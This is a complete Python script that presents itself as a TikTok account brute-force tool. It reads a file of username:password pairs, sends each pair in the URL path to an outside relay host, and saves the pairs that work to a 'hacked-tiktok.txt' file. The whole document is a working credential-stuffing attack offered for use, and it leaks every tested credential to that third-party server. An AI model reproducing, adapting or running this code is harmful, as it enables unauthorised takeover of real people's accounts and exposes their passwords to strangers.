try:
	import requests,threading,os
	Lists='V4^c_Yf4<TEw44Thyudm=§'
except Exception as Joker:exit(Joker)
PRNT=threading.Lock()
r=requests.session()
def vv1ck(*a, **b):
	with PRNT:print(*a, **b)
LINX={"K","k","1"};PHON={"P","p","2"}
red = "\033[1;31;40m";yel = '\033[1;33;40m'
grn = '\033[1;32;40m';wit = "\033[1;37;40m"
login='Done login';not_found= 'user not found';donE=20
errLogin= 'error pass';secure = 'secure'
server= 'There is pressure on the server'
errorWEB='This website is hosted by PythonAnywhere,'
stop='closed'
FILZA=input("""
1/k) [ Kali linux / Windows ]
2/p) [ iphon / android ]

Enter your device type : """)
def Check_login(user,pess):
	send=r.get(f'https://jftv.pythonanywhere.com/tik/{user}:{pess}',headers={'Host': 'jftv.pythonanywhere.com',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0','Upgrade-Insecure-Requests': '1'})
	if login in send.text:
		if FILZA in LINX:
			vv1ck(grn+f'[+] Hacked >> {user}:{pess}')
			with open('hacked-tiktok.txt', 'a') as J:
				J.write(user+':'+pess+' |@vv1ck|@TweakPY\n')
		else:
			vv1ck(f'[+] Hacked >> {user}:{pess}')
			with open('hacked-tiktok.txt', 'a') as J:
				J.write(user+':'+pess+' |@vv1ck|@TweakPY\n')
	elif secure in send.text:
		if FILZA in LINX:
			vv1ck(yel+f'[?] Secure >> {user}:{pess}')
			with open('Secure-tiktok.txt', 'a') as J:
				J.write(user+':'+pess+' |@vv1ck|@TweakPY\n')
		else:
			vv1ck(f'[?] Secure >> {user}:{pess}')
			with open('Secure-tiktok.txt', 'a') as J:
				J.write(user+':'+pess+' |@vv1ck|@TweakPY\n')
	elif errLogin in send.text:
		if FILZA in LINX:vv1ck(red+f'[-] wrong password >> {user}:{pess}')
		else:vv1ck(f'[-] wrong password >> {user}:{pess}')
	elif not_found in send.text:
		if FILZA in LINX:vv1ck(wit+f'[&] not found >> {user}')
		else:vv1ck(f'[&] not found >> {user}')
	elif server in send.text:
		if FILZA in LINX:vv1ck(yel+f'[!] '+server)
		else:vv1ck(f'[!] '+server)
	elif errorWEB in send.text:
		vv1ck("[!] Make sure the server is running and the developer hasn't shut it down")
	elif stop in send.text:vv1ck(send.text)
	else:
		print(send.text)
Lis='V4^c_Yf4<TEw44Thyudm=§'
def Email_File():
	QTR = input('\n[+] Enter the name the combo user file: ')
	try:
		vv1ck('\n\t ━━━━━━━━━━━━ Started ━━━━━━━━━━━━\n')
		for x in open(QTR,'r').read().splitlines():
			if x ==None:exit('\n     ========== completed =========')
			try:user = x.split(":")[0]
			except IndexError:exit('\n     ========== completed =========')
			try:
				pess = x.split(":")[1]
				Check_login(user,pess)
			except IndexError:pass
	except FileNotFoundError:
		vv1ck('\n[-] The file name is incorrect !\n')
		return Email_File()
def File_Mail():
	if Lis in Lists:pass
	else:exit('Okay..')
	JOlist=[]
	for JJNN1 in Lists:
		posi=ord(JJNN1)
		NW=chr(posi-donE)
		JOlist.append(NW)
	DN=''.join(JOlist)
	if FILZA in LINX:Email_File()
	else:
		vv1ck('\t\t'+DN)
		Email_File()
def Linux():
	os.system("clear")
	print(f"""
 .----------------.  .----------------.  .----------------.   .---------------{red}-.  .----------------.  .----------------.{wit}
| .--------------. || .--------------. || .--------------. | | .------------{red}--. || .--------------. || .--------------. |{wit}
| |  _________   | || |     _____    | || |  ___  ____   | | | |  ________{red}_   | || |     ____     | || |  ___  ____   | |{wit}
| | |  _   _  |  | || |    |_   _|   | || | |_  ||_  _|  | | | | |  _   {red}_  |  | || |   .'    `.   | || | |_  ||_  _|  | |{wit}
| | |_/ | | \_|  | || |      | |     | || |   | |_/ /    | | | | |_/ |{red} | \_|  | || |  /  .--.  \  | || |   | |_/ /    | |{wit}
| |     | |      | || |      | |     | || |   |  __'.    | | | |    {red} | |      | || |  | |    | |  | || |   |  __'.    | |{wit}
| |    _| |_     | || |     _| |_    | || |  _| |  \ \_  | | | |  {red} _ | |_     | || |  \  `--'  /  | || |  _| |  \ \_  | |{wit}
| |   |_____|    | || |    |_____|   | || | |____||____| | | | |{red}   |_____|    | || |   `.____.'   | || | |____||____| | |{wit}
| |              | || |              | || |              | | |{red} |              | || |              | || |              | |{wit}
| '--------------' || '--------------' || '--------------' |{red} | '--------------' || '--------------' || '--------------' |{wit}
 '----------------'  '----------------'  '----------------{red}'   '----------------'  '----------------'  '----------------'{wit} 
    Brute Force {red}Tiktok{wit} [email/user:pass]
                                   ▄︻̷̿┻̿═━一 BY {red}JOKER{wit} (@VV1CK | @TweakPY) ╾━╤デ╦︻(▀̿Ĺ̯▀̿ ̿)""")
	File_Mail()
def phone():
	print(""" 
 _____ _ _      _____      _    
/__   (_) | __ /__   \___ | | __
  / /\/ | |/ /   / /\/ _ \| |/ /
 / /  | |   <   / / | (_) |   < 
 \/   |_|_|\_\  \/   \___/|_|\_\

""")
	File_Mail()
if FILZA in LINX:Linux()
elif FILZA in PHON:phone()
else:exit('wrong choices')
